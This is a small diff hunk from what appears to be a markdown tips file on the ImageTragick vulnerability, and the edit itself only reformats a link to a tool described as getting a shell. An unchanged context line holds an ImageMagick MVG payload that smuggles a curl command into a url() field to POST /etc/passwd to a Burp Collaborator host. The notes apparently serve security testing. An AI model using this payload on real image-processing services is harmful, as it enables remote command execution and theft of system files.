@@ -18,7 +18,7 @@
     push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1")' pop graphic-context
     
 
-    (https://github.com/vishwaraj101/imagetragick)[This Tool imgetragick get shell]
+    [https://github.com/vishwaraj101/imagetragick](This Tool imgetragick get shell)
     
 ## TIP-4 
 
